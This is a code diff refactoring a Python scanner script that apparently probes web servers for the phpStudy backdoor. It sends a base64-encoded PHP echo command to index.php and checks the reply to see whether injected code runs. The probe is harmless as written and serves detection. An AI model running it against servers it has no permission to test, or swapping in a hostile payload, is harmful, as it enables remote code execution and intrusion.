@@ -10,13 +10,7 @@ import sys
 import requests
 import warnings
 import base64
-
-
-class phpstudy_backdoor:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['phpstudy后门', '', '']
         payload = "echo \"testdoor\";"
         payload = base64.b64encode(payload.encode('utf-8'))
@@ -31,7 +25,7 @@ class phpstudy_backdoor:
             'Connection': 'close',
         }
         try:
-            req = requests.get(url=self.url+'/index.php', headers=headers, verify=False,timeout=30)
+            req = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=30)
             if "testdoor" in req.text:
                 result[2]=  '存在'
             else:
@@ -40,9 +34,6 @@ class phpstudy_backdoor:
             result[2]=  '不存在'
         # print(result)
         return result
-
-
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = phpstudy_backdoor(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
